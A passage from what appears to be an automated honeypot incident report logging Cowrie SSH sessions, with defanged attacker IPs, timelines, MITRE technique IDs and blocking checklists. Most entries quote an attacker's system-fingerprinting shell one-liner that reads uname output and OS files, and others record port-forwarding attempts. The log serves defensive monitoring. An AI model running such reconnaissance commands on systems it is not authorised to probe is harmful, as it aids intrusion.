| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:29:49` | `cowrie.session.connect` |
| `2026-07-24 16:29:49` | `cowrie.client.version` |
| `2026-07-24 16:29:49` | `cowrie.client.kex` |
| `2026-07-24 16:29:51` | `cowrie.login.success` |
| `2026-07-24 16:29:53` | `cowrie.session.params` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.success` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.command.input` |
| `2026-07-24 16:29:53` | `cowrie.log.closed` |
| `2026-07-24 16:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b9468dac88

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:31 |
| **Last Seen** | 2026-07-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:31:13` | `cowrie.session.connect` |
| `2026-07-24 16:31:13` | `cowrie.client.version` |
| `2026-07-24 16:31:13` | `cowrie.client.kex` |
| `2026-07-24 16:31:15` | `cowrie.login.success` |
| `2026-07-24 16:31:16` | `cowrie.session.params` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.success` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.command.input` |
| `2026-07-24 16:31:16` | `cowrie.log.closed` |
| `2026-07-24 16:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e839251bc9bb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:32 |
| **Last Seen** | 2026-07-24 16:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:32:40` | `cowrie.session.connect` |
| `2026-07-24 16:32:41` | `cowrie.client.version` |
| `2026-07-24 16:32:41` | `cowrie.client.kex` |
| `2026-07-24 16:32:42` | `cowrie.login.success` |
| `2026-07-24 16:32:43` | `cowrie.session.params` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.success` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:43` | `cowrie.command.input` |
| `2026-07-24 16:32:44` | `cowrie.log.closed` |
| `2026-07-24 16:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a74fda354c79

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 16:33 |
| **Last Seen** | 2026-07-24 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:33:28` | `cowrie.session.connect` |
| `2026-07-24 16:33:28` | `cowrie.client.version` |
| `2026-07-24 16:33:28` | `cowrie.client.kex` |
| `2026-07-24 16:33:28` | `cowrie.login.success` |
| `2026-07-24 16:33:28` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:33:28` | `cowrie.direct-tcpip.data` |
| `2026-07-24 16:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6973f43e22f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:34 |
| **Last Seen** | 2026-07-24 16:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:34:09` | `cowrie.session.connect` |
| `2026-07-24 16:34:09` | `cowrie.client.version` |
| `2026-07-24 16:34:09` | `cowrie.client.kex` |
| `2026-07-24 16:34:10` | `cowrie.login.success` |
| `2026-07-24 16:34:11` | `cowrie.session.params` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.success` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:11` | `cowrie.command.input` |
| `2026-07-24 16:34:12` | `cowrie.log.closed` |
| `2026-07-24 16:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcef7fb5a569

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:35 |
| **Last Seen** | 2026-07-24 16:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:35:34` | `cowrie.session.connect` |
| `2026-07-24 16:35:35` | `cowrie.client.version` |
| `2026-07-24 16:35:35` | `cowrie.client.kex` |
| `2026-07-24 16:35:37` | `cowrie.login.success` |
| `2026-07-24 16:35:38` | `cowrie.session.params` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.success` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:38` | `cowrie.command.input` |
| `2026-07-24 16:35:39` | `cowrie.log.closed` |
| `2026-07-24 16:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c755c18df7f6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:36 |
| **Last Seen** | 2026-07-24 16:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:36:55` | `cowrie.session.connect` |
| `2026-07-24 16:36:55` | `cowrie.client.version` |
| `2026-07-24 16:36:55` | `cowrie.client.kex` |
| `2026-07-24 16:36:57` | `cowrie.login.success` |
| `2026-07-24 16:36:59` | `cowrie.session.params` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.success` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:36:59` | `cowrie.command.input` |
| `2026-07-24 16:37:00` | `cowrie.log.closed` |
| `2026-07-24 16:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c031fc585fca

| Field | Detail |
|---|---|
| **Source IP** | `222.99.52[.]202` |
| **First Seen** | 2026-07-24 16:37 |
| **Last Seen** | 2026-07-24 16:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:37:33` | `cowrie.session.connect` |
| `2026-07-24 16:37:34` | `cowrie.client.version` |
| `2026-07-24 16:37:34` | `cowrie.client.kex` |
| `2026-07-24 16:37:37` | `cowrie.login.success` |
| `2026-07-24 16:37:37` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.52[.]202` to AbuseIPDB if not already reported
- [ ] Block `222.99.52[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9030d700b584

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:38 |
| **Last Seen** | 2026-07-24 16:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:38:15` | `cowrie.session.connect` |
| `2026-07-24 16:38:15` | `cowrie.client.version` |
| `2026-07-24 16:38:15` | `cowrie.client.kex` |
| `2026-07-24 16:38:18` | `cowrie.login.success` |
| `2026-07-24 16:38:19` | `cowrie.session.params` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.success` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:19` | `cowrie.command.input` |
| `2026-07-24 16:38:20` | `cowrie.log.closed` |
| `2026-07-24 16:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b015d13fd6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:39 |
| **Last Seen** | 2026-07-24 16:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:39:35` | `cowrie.session.connect` |
| `2026-07-24 16:39:35` | `cowrie.client.version` |
| `2026-07-24 16:39:35` | `cowrie.client.kex` |
| `2026-07-24 16:39:37` | `cowrie.login.success` |
| `2026-07-24 16:39:39` | `cowrie.session.params` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.success` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.command.input` |
| `2026-07-24 16:39:39` | `cowrie.log.closed` |
| `2026-07-24 16:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857068adb035

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-24 16:39 |
| **Last Seen** | 2026-07-24 16:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:39:48` | `cowrie.session.connect` |
| `2026-07-24 16:39:48` | `cowrie.client.version` |
| `2026-07-24 16:39:48` | `cowrie.client.kex` |
| `2026-07-24 16:39:50` | `cowrie.login.success` |
| `2026-07-24 16:39:50` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e35875d590f

| Field | Detail |
|---|---|
| **Source IP** | `59.8.111[.]106` |
| **First Seen** | 2026-07-24 16:39 |
| **Last Seen** | 2026-07-24 16:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:39:55` | `cowrie.session.connect` |
| `2026-07-24 16:39:56` | `cowrie.client.version` |
| `2026-07-24 16:39:56` | `cowrie.client.kex` |
| `2026-07-24 16:39:58` | `cowrie.login.success` |
| `2026-07-24 16:39:59` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.8.111[.]106` to AbuseIPDB if not already reported
- [ ] Block `59.8.111[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee45bd69885

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:40 |
| **Last Seen** | 2026-07-24 16:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:40:56` | `cowrie.session.connect` |
| `2026-07-24 16:40:56` | `cowrie.client.version` |
| `2026-07-24 16:40:56` | `cowrie.client.kex` |
| `2026-07-24 16:40:58` | `cowrie.login.success` |
| `2026-07-24 16:41:00` | `cowrie.session.params` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.success` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.command.input` |
| `2026-07-24 16:41:00` | `cowrie.log.closed` |
| `2026-07-24 16:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0afe58447a

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-07-24 16:41 |
| **Last Seen** | 2026-07-24 16:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:41:01` | `cowrie.session.connect` |
| `2026-07-24 16:41:03` | `cowrie.client.version` |
| `2026-07-24 16:41:03` | `cowrie.client.kex` |
| `2026-07-24 16:41:08` | `cowrie.login.success` |
| `2026-07-24 16:41:09` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2793faff56

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:42 |
| **Last Seen** | 2026-07-24 16:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:42:19` | `cowrie.session.connect` |
| `2026-07-24 16:42:19` | `cowrie.client.version` |
| `2026-07-24 16:42:19` | `cowrie.client.kex` |
| `2026-07-24 16:42:21` | `cowrie.login.success` |
| `2026-07-24 16:42:22` | `cowrie.session.params` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:22` | `cowrie.command.success` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:22` | `cowrie.command.input` |
